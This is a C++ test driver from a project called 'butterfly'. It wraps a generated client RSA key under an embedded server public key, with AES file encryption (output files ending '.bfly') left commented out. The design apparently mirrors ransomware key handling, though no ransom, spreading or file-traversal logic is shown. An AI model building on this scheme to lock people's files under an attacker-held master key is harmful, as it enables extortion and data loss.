
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"
#include "aesKeyDatabase.h"

void test_rsa_enc()
{
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA (new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
    // Init rsaEncryptAESKey with keysize 2048
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey(new butterfly::rsa::RSAEncryptor(2048));

    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    butterfly::writeBinFile("CPrivateRSA.pem", cprivateRSAKeyFile.c_str(), static_cast<long>(cprivateRSAKeyFile.length()));

    // Encrypt the CPrivateRSA.pem
    rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile.substr(0, cprivateRSAKeyFile.size() - 1));
    //rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile);

    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();

    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));

}

void test_rsa_dec()
{
    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor(new butterfly::rsa::RSADecryptor("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptor->getBinKeyFileContents("CPrivateRSA.bin");

    std::cout << "Enc: " << encCPrivateRSA << std::endl;
    rsaDecryptor->decrypt(rsaDecryptor->getEvpPkey(), encCPrivateRSA);
    std::string decrpyted = rsaDecryptor->getDecryptedMessage();
    butterfly::writeBinFile("CPrivateRSA.pem.dec", decrpyted.c_str(), static_cast<long>(decrpyted.length()));
    std::cout << "Decrypted: " << decrpyted.size() << std::endl;
}

void test_rsa_enc_evp()
{
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA (new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
    // Init rsaEncryptAESKey with keysize 2048
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey(new butterfly::rsa::RSAEncryptor(2048));


    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    butterfly::writeBinFile("CPrivateRSA.pem", cprivateRSAKeyFile.c_str(), static_cast<long>(cprivateRSAKeyFile.length()));

    // Encrypt the CPrivateRSA.pem
    //rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile.substr(0, cprivateRSAKeyFile.size() - 1));
    rsaEncryptCPrivateRSA->encryptEVP(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile);

    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();

    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));

};

void test_rsa_dec_evp()
{

    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor(new butterfly::rsa::RSADecryptor("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptor->getBinKeyFileContents("CPrivateRSA.bin");

    std::cout << "Enc: " << encCPrivateRSA << std::endl;
    rsaDecryptor->decryptEVP(rsaDecryptor->getEvpPkey(), encCPrivateRSA);
    std::string decrypted = rsaDecryptor->getDecryptedMessage();
    butterfly::writeBinFile("CPrivateRSA.pem.dec", decrypted.c_str(), static_cast<long>(decrypted.length()));
    std::cout << "Decrypted: " << decrypted.size() << std::endl;
}

int main(int argc, char *argv[])
{
    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
    std::cout << argc << *argv <<std::endl;
    test_rsa_enc_evp();
    sleep(1);
    test_rsa_dec_evp();
    exit(1);
    /*
    /////// Hybrid Part ////////

    // start encryption
    std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));

    encryptor->encryptCPrivateRSA();
    encryptor->encryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf");

    encryptor->encryptAESKeyFile("AESKey.txt");


    sleep(10);

    // start decryption
    std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
    std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem");
    std::string aesKey = decryptor->decryptAESKey(cprivate, "AESKey.bin");
    decryptor->decryptFileWithAES("/home/christian/projects/butterfly/bin/data/test.pdf", aesKey);

    */
    ////// AES PART ///////
    /*
    std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
    aesEncryptor->generateAESKey();
    std::string aeskey = aesEncryptor->getAESKey();
    std::string aesiv = aesEncryptor->getAESIv();
    butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
    butterfly::writeBinFile("AESIv.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
    std::string s = "/home/christian/projects/butterfly/bin/data/test.pdf";
    aesEncryptor->encryptFile(s);
    */

    /*
    std::unique_ptr<butterfly::aes::AESDecryptor> aesDecryptor(new butterfly::aes::AESDecryptor());
    std::string aeskey = butterfly::readBinFile("AESKey.txt");
    std::string aesiv = butterfly::readBinFile("AESIv.txt");
    aesDecryptor->setAESKey(aeskey);
    aesDecryptor->setAESIv(aesiv);
    std::string s = "/home/christian/projects/butterfly/bin/test.pdf.bfly";
    aesDecryptor->decryptFile(s);
    */
    
     return 0;
}